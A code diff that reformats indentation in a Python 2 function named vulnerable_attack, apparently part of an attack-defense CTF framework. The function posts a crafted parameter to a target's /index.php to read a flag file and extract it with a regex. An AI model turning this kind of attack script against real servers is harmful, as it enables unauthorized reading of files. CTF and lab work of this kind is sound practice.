@@ -7,7 +7,7 @@ from urllib import quote
 import traceback
 
 def vulnerable_attack(target,target_port,cmd):
-	
+        
     '''
     this is the payload script for vuln:
 
@@ -19,7 +19,7 @@ def vulnerable_attack(target,target_port,cmd):
     try:
         cmd = flag_path
         data = '444=%s'% quote(cmd) 
-	res = http("post",target,target_port,"/index.php",data,headers)
+        res = http("post",target,target_port,"/index.php",data,headers)
         # Even though we can not execute the cmd with the vuln, but we can read flag
         # and we want to use our framework to carry out this attack
         # not do the replicate tasks to code a new script
@@ -29,9 +29,9 @@ def vulnerable_attack(target,target_port,cmd):
             res = tmp.group()
             res = cmd_prefix + res + cmd_postfix
     except Exception,e:
-	debug_print(traceback.format_exc())	
-	dump_error("attack failed",target,"vulnerable attack")
-	res = "error"
+        debug_print(traceback.format_exc())     
+        dump_error("attack failed",target,"vulnerable attack")
+        res = "error"
 
     return res
 
